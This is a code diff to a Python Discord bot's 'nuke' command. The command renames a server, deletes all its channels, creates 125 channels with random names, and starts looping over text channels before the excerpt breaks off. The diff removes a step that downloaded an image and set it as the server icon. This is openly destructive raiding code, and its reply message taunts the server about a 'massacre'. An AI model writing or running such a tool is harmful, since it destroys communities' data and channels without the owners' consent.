@@ -39,17 +39,12 @@ async def on_ready():
 async def nuke(ctx):
     await ctx.send("You wanna see what the massacre is? ill let u see it")
     await ctx.guild.edit(name=SERVNICK)
-    with open('avatar.png', 'wb') as avatar_file:
-        avatar_file.write(rq.get(SERVAV).content)
-    with open('avatar.png', 'rb') as avatar_file:
-        avatar = avatar_file.read()
-        await ctx.guild.edit(icon=avatar)
-        guild = ctx.guild
-        for channel in list(ctx.guild.channels):
-          try:
-            await channel.delete()
-          except:
-            print("DELETING CHANNELS: FAILED")
+    guild = ctx.guild
+    for channel in list(ctx.guild.channels):
+      try:
+        await channel.delete()
+      except:
+        print("DELETING CHANNELS: FAILED")
     for _i in range(125):
         await ctx.guild.create_text_channel(name=(random.choice(CHANNELS)))
     for channel in guild.text_channels:
